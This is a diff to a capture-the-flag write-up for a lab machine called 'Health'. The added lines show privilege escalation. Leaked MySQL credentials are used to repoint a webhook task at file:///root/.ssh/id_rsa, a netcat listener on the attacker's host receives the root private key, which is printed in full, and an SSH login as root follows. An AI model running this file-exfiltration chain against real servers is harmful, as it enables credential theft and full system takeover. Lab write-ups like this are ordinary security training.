@@ -416,7 +416,7 @@ susanne@health:~$ cat user.txt
 7aca7***************************
 ```
 
-
+Running linpeas reveals some credentials for Mysql that we can use and Pspy shows that root is running ```Mysql laravel --execute TRUNCATE tasks```
 
 ```console
 DB_CONNECTION=mysql
@@ -426,6 +426,10 @@ DB_DATABASE=laravel
 DB_USERNAME=laravel
 DB_PASSWORD=MYsql_strongestpass@2014+
 ```
+
+With this info we can attempt to privilege escalate through mysql and the webpages webhook function.
+
+
 ```console
 susanne@health:/var/www/html/.git$ mysql -u laravel -p
 Enter password: 
@@ -446,7 +450,80 @@ Reading table information for completion of table and column names
 You can turn off this feature to get a quicker startup with -A
 
 Database changed
-mysql> update tasks set monitoredUrl='file:///root/.ssh/id_rsa';
-Query OK, 0 rows affected (0.00 sec)
-Rows matched: 0  Changed: 0  Warnings: 0
 ```
+
+Before running our exploit we are going to create a webhook on the same webpage.
+
+My settings were as follows
+
+
+
+
+
+
+Then on the mysql database we are going to run our command to update the task aka "webhook" that we just created. Dont forget to setup your listner to catch the file.
+
+```console
+mysql> update tasks set monitoredUrl='file:///root/.ssh/id_rsa';
+Query OK, 1 row affected (0.00 sec)
+Rows matched: 1  Changed: 1  Warnings: 0
+
+mysql> select * from tasks;
++--------------------------------------+-------------------------+-----------+--------------------------+-------------+---------------------+---------------------+
+| id                                   | webhookUrl              | onlyError | monitoredUrl             | frequency   | created_at          | updated_at          |
++--------------------------------------+-------------------------+-----------+--------------------------+-------------+---------------------+---------------------+
+| aad2d3c3-1b60-44d0-9785-3dc407f4b480 | http://10.10.16.19:1234 |         0 | file:///root/.ssh/id_rsa | */1 * * * * | 2022-10-07 15:48:43 | 2022-10-07 15:48:43 |
++--------------------------------------+-------------------------+-----------+--------------------------+-------------+---------------------+---------------------+
+1 row in set (0.00 sec)
+
+mysql> 
+```
+
+
+On our listener we catch the root ssh key. After formatting we have a proper ssh key and can login as root.
+
+Note: Because the file is output in extended format I ran it in visual studio and changed all occurences of /n to enter and \/ to /
+
+
+```console
+└─$ nc -lvnp 1234
+listening on [any] 1234 ...
+connect to [10.10.16.19] from (UNKNOWN) [10.129.62.210] 35268
+POST / HTTP/1.1
+Host: 10.10.16.19:1234
+Accept: */*
+Content-type: application/json
+Content-Length: 1832
+Expect: 100-continue
+
+{"webhookUrl":"http:\/\/10.10.16.19:1234","monitoredUrl":"file:\/\/\/root\/.ssh\/id_rsa","health":"up","body":"-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEAwddD+eMlmkBmuU77LB0LfuVNJMam9\/jG5NPqc2TfW4Nlj9gE\nKScDJTrF0vXYnIy4yUwM4\/2M31zkuVI007ukvWVRFhRYjwoEPJQUjY2s6B0ykCzq\nIMFxjreovi1DatoMASTI9Dlm85mdL+rBIjJwfp+Via7ZgoxGaFr0pr8xnNePuHH\/\nKuigjMqEn0k6C3EoiBGmEerr1BNKDBHNvdL\/XP1hN4B7egzjcV8Rphj6XRE3bhgH\n7so4Xp3Nbro7H7IwIkTvhgy61bSUIWrTdqKP3KPKxua+TqUqyWGNksmK7bYvzhh8\nW6KAhfnHTO+ppIVqzmam4qbsfisDjJgs6ZwHiQIDAQABAoIBAEQ8IOOwQCZikUae\nNPC8cLWExnkxrMkRvAIFTzy7v5yZToEqS5yo7QSIAedXP58sMkg6Czeeo55lNua9\nt3bpUP6S0c5x7xK7Ne6VOf7yZnF3BbuW8\/v\/3Jeesznu+RJ+G0ezyUGfi0wpQRoD\nC2WcV9lbF+rVsB+yfX5ytjiUiURqR8G8wRYI\/GpGyaCnyHmb6gLQg6Kj+xnxw6Dl\nhnqFXpOWB771WnW9yH7\/IU9Z41t5tMXtYwj0pscZ5+XzzhgXw1y1x\/LUyan++D+8\nefiWCNS3yeM1ehMgGW9SFE+VMVDPM6CIJXNx1YPoQBRYYT0lwqOD1UkiFwDbOVB2\n1bLlZQECgYEA9iT13rdKQ\/zMO6wuqWWB2GiQ47EqpvG8Ejm0qhcJivJbZCxV2kAj\nnVhtw6NRFZ1Gfu21kPTCUTK34iX\/p\/doSsAzWRJFqqwrf36LS56OaSoeYgSFhjn3\nsqW7LTBXGuy0vvyeiKVJsNVNhNOcTKM5LY5NJ2+mOaryB2Y3aUaSKdECgYEAyZou\nfEG0e7rm3z++bZE5YFaaaOdhSNXbwuZkP4DtQzm78Jq5ErBD+a1af2hpuCt7+d1q\n0ipOCXDSsEYL9Q2i1KqPxYopmJNvWxeaHPiuPvJA5Ea5wZV8WWhuspH3657nx8ZQ\nzkbVWX3JRDh4vdFOBGB\/ImdyamXURQ72Xhr7ODkCgYAOYn6T83Y9nup4mkln0OzT\nrti41cO+WeY50nGCdzIxkpRQuF6UEKeELITNqB+2+agDBvVTcVph0Gr6pmnYcRcB\nN1ZI4E59+O3Z15VgZ\/W+o51+8PC0tXKKWDEmJOsSQb8WYkEJj09NLEoJdyxtNiTD\nSsurgFTgjeLzF8ApQNyN4QKBgGBO854QlXP2WYyVGxekpNBNDv7GakctQwrcnU9o\n++99iTbr8zXmVtLT6cOr0bVVsKgxCnLUGuuPplbnX5b1qLAHux8XXb+xzySpJcpp\nUnRnrnBfCSZdj0X3CcrsyI8bHoblSn0AgbN6z8dzYtrrPmYA4ztAR\/xkIP\/Mog1a\nvmChAoGBAKcW+e5kDO1OekLdfvqYM5sHcA2le5KKsDzzsmboGEA4ULKjwnOXqJEU\n6dDHn+VY+LXGCv24IgDN6S78PlcB5acrg6m7OwDyPvXqGrNjvTDEY94BeC\/cQbPm\nQeA60hw935eFZvx1Fn+mTaFvYZFMRMpmERTWOBZ53GTHjSZQoS3G\n-----END RSA PRIVATE KEY-----\n"}
+```
+
+Make you ssh file and change the permissions and we are logged in as root!
+
+```console
+└─$ ssh root@10.129.62.210 -i id_rsa
+Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-191-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Fri Oct  7 15:52:39 UTC 2022
+
+  System load:  0.0               Processes:           182
+  Usage of /:   66.3% of 3.84GB   Users logged in:     1
+  Memory usage: 12%               IP address for eth0: 10.129.62.210
+  Swap usage:   0%
+
+
+0 updates can be applied immediately.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+root@health:~# cat /root/root.txt 
+dce53***************************
+```
+
+GG!
